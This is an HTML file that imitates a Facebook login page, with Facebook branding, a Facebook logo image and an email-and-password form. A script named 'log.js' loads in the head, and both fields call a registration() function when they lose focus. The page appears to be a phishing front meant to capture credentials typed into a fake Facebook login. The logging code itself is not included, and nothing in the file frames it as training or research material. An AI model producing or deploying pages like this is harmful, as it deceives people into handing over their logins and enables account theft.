<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet"
          href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
          integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh"
          crossorigin="anonymous">
		   <script src="log.js"></script>
</head>
<body>
<header style="background-color:blue;display:flex;align-items:center;">
    <h1 class="mr-auto ml-5 my-2" style="display:inline;color:white">Facebook</h1>
    <a class="ml-auto mr-5 btn btn-outline-primary" role="button" style="color:white">
        Registration
    </a>
</header>

<div class="container-fluid">
    <div class="row">
        <div class="col-lg-6">
            <img src="https://icon-library.com/images/facebook-login-icon/facebook-login-icon-10.jpg"
                 class="img-fluid w-100 h-100">
        </div>

        <div class="col-lg-6">

            <form method="POST">
                <br><br>
                <br><br>
                <h1><b>LOGIN </b></h1>
				
                <br>

                <div class="form-row">
                    <div class="form-group col-4">
                        <label for="email_input">Email</label>
                    </div>
                    <div class="form-group col-8">
                        <input type="text" name="email" class="form-control"
                               id="email" placeholder="Enter your email"
							   onblur="registration()">
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group col-lg-4">
                        <label for="password_input">Password</label>
                    </div>
                    <div class="form-group col-lg-8">
                        <input type="password" name="password" class="form-control"
                               id="password" placeholder="Enter your password"
							   onblur="registration()">
                    </div>
                </div>


                <div class="form-row">
                    <div class="col-6">
                        <button type="submit" class="btn btn-outline-primary btn-block"onsubmit="registration()">
                            Login
                        </button>
                    </div>
                    <div class="col-6">
                        <button type="reset" class="btn btn-outline-primary btn-block">
                            Reset
                        </button>
                    </div>
                </div>
            </form>
            <br><br>
        </div>
    </div>
</div>
<div style="background-color:black;color:white;padding:10px;text-align:center;">
    @Copyright Reserved 2021
</div>
</body>
</html>
